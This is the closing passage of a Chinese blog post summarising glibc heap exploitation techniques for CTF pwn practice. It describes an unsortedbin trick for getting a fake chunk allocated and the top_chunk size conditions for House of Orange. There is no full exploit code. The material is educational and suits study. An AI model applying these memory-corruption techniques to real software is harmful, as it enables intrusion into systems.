<li>申请fake_chunk<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">**2.23版本**  </span><br><span class="line">- 初状态  </span><br><span class="line">unsortedbin --&gt; chunk_victim  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">此时我们令chunk_victim.bk = fake_chunk_head</span></span><br><span class="line"></span><br><span class="line">- 末状态  </span><br><span class="line">unsortedbin  --&gt; chunk_victim --&gt; fake_chunk</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">连续申请两个chunk即可申请到fake_chunk</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="Largebin-Attack"><a href="#Largebin-Attack" class="headerlink" title="Largebin Attack"></a>Largebin Attack</h2><h1 id="Kinds-of-House"><a href="#Kinds-of-House" class="headerlink" title="Kinds of House"></a>Kinds of House</h1><h2 id="HouseofOrange"><a href="#HouseofOrange" class="headerlink" title="HouseofOrange"></a>HouseofOrange</h2><h3 id="概述-3"><a href="#概述-3" class="headerlink" title="概述"></a>概述</h3><p>HouseofOrange是在程序没有可以操控的free时，利用ptmalloc的管理机制强行制造出一个unsortedbin中的chunk的技术。    </p>
<h3 id="伪造chunk需求"><a href="#伪造chunk需求" class="headerlink" title="伪造chunk需求"></a>伪造chunk需求</h3><ol>
<li><p>top_chunk的结束地址必须页对齐  </p>
<ul>
<li>一般情况下，ptmalloc设置top_chunk为0x21000，我们申请一个0x10的chunk0后，chunk0加上chunk_head是0x20大小，此时top_chunk切割后还剩下0x20fe0大小，为了页对齐，我们伪造top_chunk的大小为0xfe0即可  </li>
</ul>
</li>
<li><p>top_chunk.size &gt;= MINSIZE  </p>
</li>
<li><p>top_chunk.size &lt; chunk_size + MINSIZE</p>
</li>
<li><p>top_chunk.prev_inuse == 1</p>
<ul>
<li>第一点中说的0xfe0要变为0xfe1 </li>
</ul>
</li>
</ol>

    </div>

    
    
    
        

<div>
<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>Gap
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://heygap.github.io/2023/09/22/Pwn%20-%20Heap%20Exploit%20Summary/" title="Pwn - Heap Exploit Summary">http://heygap.github.io/2023/09/22/Pwn - Heap Exploit Summary/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


      <div>
        
          <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------文章就到这里啦！<i class="fa fa-paw"></i>感谢您的阅读XD-------------</div>
    
</div>
        
      </div>

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Heap/" rel="tag"># Heap</a>
              <a href="/tags/Pwn/" rel="tag"># Pwn</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/09/22/2023SICTF-Pwn-baby_heap-wp/" rel="prev" title="2023SICTF-Pwn-baby_heap-wp">
      <i class="fa fa-chevron-left"></i> 2023SICTF-Pwn-baby_heap-wp
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/09/30/Symbolic%20Execution%20Leaning%20Note%20(1)%20--%20Basis/" rel="next" title="Symbolic Execution Leaning Note (1) -- Basis">
      Symbolic Execution Leaning Note (1) -- Basis <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Patchelf%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">1.</span> <span class="nav-text">Patchelf的使用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#libc-%E5%8C%85%E7%9A%84%E4%B8%8B%E8%BD%BD"><span class="nav-number">1.1.</span> <span class="nav-text">libc 包的下载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#patch-elf%E6%96%87%E4%BB%B6"><span class="nav-number">1.2.</span> <span class="nav-text">patch elf文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%AF%A6%E8%A7%A3-%E2%80%98%E7%94%B3%E8%AF%B7%E4%B8%8E%E9%87%8A%E6%94%BE-chunk%E2%80%99-%E6%9C%AA%E5%AE%8C%E6%88%90"><span class="nav-number">2.</span> <span class="nav-text">详解 ‘申请与释放 chunk’(未完成)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%B3%E8%AF%B7-chunk"><span class="nav-number">2.1.</span> <span class="nav-text">申请 chunk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%87%8A%E6%94%BE-chunk"><span class="nav-number">2.2.</span> <span class="nav-text">释放 chunk</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Chunk-Extend-and-Overlapping"><span class="nav-number">3.</span> <span class="nav-text">Chunk Extend and Overlapping</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E5%90%91-Overlap"><span class="nav-number">3.1.</span> <span class="nav-text">后向 Overlap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E5%90%91-Overlap"><span class="nav-number">3.2.</span> <span class="nav-text">前向 Overlap</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Use-After-Free"><span class="nav-number">4.</span> <span class="nav-text">Use After Free</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Double-Free"><span class="nav-number">5.</span> <span class="nav-text">Double Free</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">5.1.</span> <span class="nav-text">概述</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kinds-of-Bin"><span class="nav-number">6.</span> <span class="nav-text">Kinds of Bin</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Tcachebin"><span class="nav-number">6.1.</span> <span class="nav-text">Tcachebin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0-1"><span class="nav-number">6.1.1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Leak"><span class="nav-number">6.1.2.</span> <span class="nav-text">Leak</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#bss%E6%AE%B5-heap-list-%E6%B3%84%E9%9C%B2"><span class="nav-number">6.1.2.1.</span> <span class="nav-text">bss段 heap_list 泄露</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Write"><span class="nav-number">6.1.3.</span> <span class="nav-text">Write</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Double-Free-1"><span class="nav-number">6.1.3.1.</span> <span class="nav-text">Double Free</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastbin"><span class="nav-number">6.2.</span> <span class="nav-text">Fastbin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0-2"><span class="nav-number">6.2.1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Leak-1"><span class="nav-number">6.2.2.</span> <span class="nav-text">Leak</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Write-1"><span class="nav-number">6.2.3.</span> <span class="nav-text">Write</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Double-Free-2"><span class="nav-number">6.2.3.1.</span> <span class="nav-text">Double Free</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Unsortedbin"><span class="nav-number">6.3.</span> <span class="nav-text">Unsortedbin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#leak"><span class="nav-number">6.3.1.</span> <span class="nav-text">leak</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#write"><span class="nav-number">6.3.2.</span> <span class="nav-text">write</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Largebin-Attack"><span class="nav-number">6.4.</span> <span class="nav-text">Largebin Attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kinds-of-House"><span class="nav-number">7.</span> <span class="nav-text">Kinds of House</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HouseofOrange"><span class="nav-number">7.1.</span> <span class="nav-text">HouseofOrange</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0-3"><span class="nav-number">7.1.1.</span> <span class="nav-text">概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0chunk%E9%9C%80%E6%B1%82"><span class="nav-number">7.1.2.</span> <span class="nav-text">伪造chunk需求</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Gap"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">Gap</p>
  <div class="site-description" itemprop="description">An undergraduate student of Cybersecurity at SDU.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">13</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="sidebar-button motion-element"><i class="fa fa-comment"></i>
    Chat
  </a>
  </div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/HeyGap" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;HeyGap" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/2310769056@qq.com" title="E-Mail → 2310769056@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Gap</span>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

  

</body>
</html>
